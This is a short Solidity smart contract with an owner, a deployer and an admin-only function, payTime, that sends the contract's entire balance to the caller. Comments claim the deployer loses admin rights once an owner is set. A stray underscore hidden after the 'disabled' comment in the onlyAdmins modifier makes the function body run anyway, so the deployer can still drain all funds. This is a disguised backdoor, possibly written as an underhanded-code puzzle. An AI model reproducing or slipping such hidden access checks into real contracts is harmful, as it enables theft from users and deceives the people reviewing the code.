//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.1;

contract test{
    
    address owner = address(0);
    address deployer = address(1);
    bool deployerActive = true;

    constructor(address ownerAddress){
        deployer = msg.sender;
        if (ownerAddress != address(0)){
            /* Owner is set. That means the deployer should be deactivated as admin */
            deployerActive = false;
            owner = ownerAddress;
        }
    }
    

   modifier onlyAdmins {

        /* Non-admins go away, haha ʕノ•ᴥ•ʔノ ︵ ┻━┻ */
        require(msg.sender == owner || msg.sender == deployer);

       /* The owners can always call this thing! */
      /*  And Deployer can call it, if he's still active */ 
      if (msg.sender == owner || deployerActive){
          _;
          return;
      }
      /* Ahh, no, this method is *disabled* (╯°□°）╯︵ ┻━┻ */_
    
     ;}

    /* This is very special admin function. Drain contract of all money! */
    function payTime() onlyAdmins public  returns(bool){

        msg.sender.transfer(address(this).balance);
        return true;
    }
    
    /* Disable the deployer super-powers */
    function disableDeployer() onlyAdmins external{
        deployerActive = false;
    }
}
